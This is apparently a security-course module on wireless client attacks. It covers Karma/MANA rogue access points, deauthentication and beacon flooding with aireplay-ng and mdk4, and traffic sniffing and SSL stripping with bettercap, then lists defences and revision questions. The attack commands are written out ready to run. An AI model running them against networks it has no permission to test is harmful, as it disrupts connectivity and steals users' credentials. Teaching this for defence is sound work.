# Wireless Client Attacks

## Unit 7 - Topic 4 | Wireless Network Testing

---

## Overview

**Wireless client attacks** target individual devices rather than access points. By exploiting client behaviors like auto-connection to known networks, probe requests, and weak security configurations, attackers can intercept traffic, steal credentials, and compromise devices.

---

## 1. Client Attack Surface

```
WIRELESS CLIENT VULNERABILITIES:

AUTO-CONNECT BEHAVIOR:
├── Devices store Preferred Network List (PNL)
├── Auto-connect to any matching SSID
├── Probe requests reveal known networks
├── No AP authentication verification (most clients)
└── Evil twin exploits this behavior

PROBE REQUESTS:
├── "Is CORP-WIFI here?"
├── "Is Starbucks_WiFi here?"
├── "Is HOME-NETWORK here?"
├── Broadcasts reveal user's network history
└── Attacker creates matching AP → auto-connect!

CLIENT ISOLATION BYPASS:
├── Clients on same AP can communicate
├── AP client isolation prevents direct access
├── But: ICMP redirect, DNS, ARP attacks bypass
└── Always assume shared WiFi is hostile
```

---

## 2. Karma/MANA Attacks

```bash
# === KARMA ATTACK ===
# Respond to ALL client probe requests
# "Looking for HOME-WIFI?" → "That's me!"
# "Looking for CORP-WIFI?" → "That's me too!"
# Client auto-connects to attacker's AP

# === HOSTAPD-MANA (Modern Karma) ===
# hostapd-mana.conf:
interface=wlan0
driver=nl80211
ssid=FREE-WIFI
channel=6
enable_mana=1
mana_loud=1
# Responds to all probe requests

sudo hostapd-mana hostapd-mana.conf

# === WIFIPUMPKIN3 ===
sudo wifipumpkin3
# Built-in Karma/MANA support
# Captive portal
# Credential capture
# SSL stripping

# === TARGETED KARMA ===
# Only respond to specific SSIDs:
# mana_ssids=CORP-WIFI,GUEST-WIFI
# More stealthy, focused attack
```

---

## 3. Deauthentication Attacks

```bash
# === DEAUTH (Denial of Service) ===
# IEEE 802.11 management frames are NOT authenticated
# Anyone can send deauth frames

# Deauth all clients from AP:
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# -a: AP BSSID
# 0: Continuous

# Deauth specific client:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 wlan0mon
# -c: Client MAC

# === MDK4 (Advanced Deauth/DoS) ===
# Deauth all clients on a channel:
mdk4 wlan0mon d -c 6

# Beacon flooding (create thousands of fake APs):
mdk4 wlan0mon b -f ssids.txt -c 6
# DoS: Client WiFi list flooded with fake networks

# Authentication flood:
mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF
# Overwhelm AP with auth requests

# === 802.11w (Management Frame Protection) ===
# WPA3 and some WPA2 APs protect management frames
# Makes deauth attacks impossible
# Check: iw dev wlan0 scan | grep -A5 "RSN"
```

---

## 4. Client Traffic Interception

```bash
# === AFTER CLIENT CONNECTS TO EVIL TWIN ===

# Capture all traffic:
sudo tcpdump -i wlan0 -w client_traffic.pcap

# HTTP credential capture:
sudo tcpdump -i wlan0 -A port 80 | grep -i "user\|pass\|login"

# DNS queries (browsing history):
sudo tcpdump -i wlan0 -n port 53

# === BETTERCAP ON EVIL TWIN ===
sudo bettercap -iface wlan0
net.sniff on
# Captures credentials, URLs, cookies

# SSL stripping:
set http.proxy.sslstrip true
http.proxy on

# === CREDENTIAL CAPTURE TOOLS ===
# WiFi-Pumpkin3 modules:
# ├── net-creds (credentials from traffic)
# ├── dns2proxy (DNS manipulation)
# ├── sslstrip (HTTPS downgrade)
# └── beef (Browser Exploitation Framework)
```

---

## 5. Client Attack Prevention

| Defense | Description |
|---------|-------------|
| **Forget open networks** | Remove from Preferred Network List |
| **Disable auto-connect** | Manual WiFi selection only |
| **Use VPN** | Encrypts all traffic on any network |
| **802.11w (PMF)** | Protected Management Frames |
| **WIDS/WIPS** | Detect rogue APs and deauth |
| **Verify certificates** | Don't ignore TLS warnings |
| **Disable WiFi** | Turn off when not in use |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Probe requests** | Reveal client's known network list |
| **Karma/MANA** | Respond to all probes → auto-connect |
| **Deauth** | Disconnect clients (unauthenticated frames) |
| **MDK4** | Advanced deauth and WiFi DoS tool |
| **802.11w** | Management Frame Protection (prevents deauth) |
| **Defense** | VPN, forget networks, disable auto-connect |

---

## Quick Revision Questions

1. **What are probe requests and why are they a security risk?**
2. **How does a Karma attack exploit client behavior?**
3. **Why are deauthentication attacks possible?**
4. **What is 802.11w and how does it help?**
5. **How can users protect themselves on public WiFi?**

---

[← Previous: Evil Twin Attacks](03-evil-twin-attacks.md) | [Next: Bluetooth Security →](05-bluetooth-security.md)

---

*Unit 7 - Topic 4 of 6 | [Back to README](../README.md)*
